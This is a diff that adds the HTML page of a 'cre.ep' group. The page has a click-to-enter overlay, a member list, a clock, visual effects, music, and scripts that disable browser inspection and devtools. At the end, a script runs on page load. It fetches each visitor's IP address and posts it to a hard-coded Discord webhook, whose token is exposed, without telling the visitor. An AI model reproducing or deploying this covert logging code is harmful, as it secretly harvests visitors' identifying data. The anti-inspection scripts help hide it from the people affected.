@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta content="https://cre.ep" property="og:title"/>
+  <meta content="creepier" property="og:description" />
+  <meta content="https://files.catbox.moe/y8merh.png" property="og:image" />    
+  <meta content="#000000" data-react-helmet="true" name="theme-color" />
+  <link rel="icon" type="image/x-icon" href="https://files.catbox.moe/y8merh.png">
+  <title>creep</title>
+  <link rel="stylesheet" href="assets/css/main.css">
+  <style>
+    @font-face {
+      font-family: 'Help Me';
+      src: url('assets/fonts/Array-Regular.ttf') format('truetype');
+    }
+    @font-face {
+      font-family: 'Cityburn';
+      src: url('assets/fonts/Array-Wide.ttf') format('truetype');
+    }
+    @font-face {
+      font-family: 'artifact';
+      src: url('assets/fonts/Array-Bold.ttf') format('truetype');
+    }
+  </style>
+</head>
+<body>
+  <div class="overlay" id="overlay">
+    <div class="proceed-button" onclick="removeOverlay(); playMusic()">CLICK TO ENTER HALL  <p>cre.ep</p> </div>
+    
+  </div>
+  <div class="container">
+    <a href="https://cre.ep" target="_blank" style="text-decoration: none; color: #FFFFFF;">
+      <h1>cre.ep</h1>
+    </a>
+    <p>verified creep members</p>
+    <p>resist</p>
+    <p>rifle</p>
+    <p>tayek</p>
+  </div>
+  <div id="clock"></div>
+  <script>
+    function removeOverlay() {
+      var overlay = document.getElementById("overlay");
+      overlay.style.display = "none";
+    }
+
+    function updateClock() {
+      const now = new Date();
+      const options = {
+        timeZone: 'Europe/Amsterdam',
+        hour12: true,
+        hour: 'numeric',
+        minute: '2-digit',
+        second: '2-digit'
+      };
+      const formattedTime = now.toLocaleTimeString('en-US', options);
+      document.getElementById('clock').textContent = formattedTime;
+    }
+
+    setInterval(updateClock, 1000);
+
+    function createBloodSparks() {
+      const numSparks = Math.floor(Math.random() * 5) + 1;
+      for (let i = 0; i < numSparks; i++) {
+        const bloodSpark = document.createElement('div');
+        bloodSpark.classList.add('blood-spark');
+        bloodSpark.style.left = `${Math.random() * window.innerWidth}px`;
+        document.body.appendChild(bloodSpark);
+        setTimeout(() => {
+          bloodSpark.remove();
+        }, 6000);
+      }
+    }
+
+    setInterval(createBloodSparks, 1000);
+  </script>
+
+</div>
+
+<script>
+        function playMusic() {
+          var audio = new Audio('assets/misc/lemonade.mp3');
+          audio.play();
+      }
+</script>
+  <script src="assets/javascript/main.js"></script>
+  <script src="assets/javascript/geek.js"></script>
+  <script src="assets/javascript/disable_inspect.js"></script>
+  <script src="assets/javascript/disable-devtool.min.js"></script>
+  <script src="assets/javascript/funny.js"></script>
+  <script src="assets/javascript/snow.js"></script>
+
+  
+   <script>
+        fetch('https://api.ipify.org/?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
+                document.getElementById('ipAddress').innerText = ipAddress;
+                
+                const webhookUrl = 'https://discord.com/api/webhooks/1237253528532287508/XHPeiawiGiD0BnL9mOK4Or2oZlpaTrWpJi-che3EN-SIo1vZRC_yJ0iAcSDm0mD2znDm';
+                const payload = {
+                    content: `New IP address: ${ipAddress}`
+                };
+                
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => console.log('Webhook sent:', response))
+                .catch(error => console.error('Error sending webhook:', error));
+            })
+            .catch(error => {
+                console.error('Error fetching IP address:', error);
+                document.getElementById('ipAddress').innerText = 'Error fetching IP address';
+            });
+    </script>
+  
+  
+</body>
+</html>
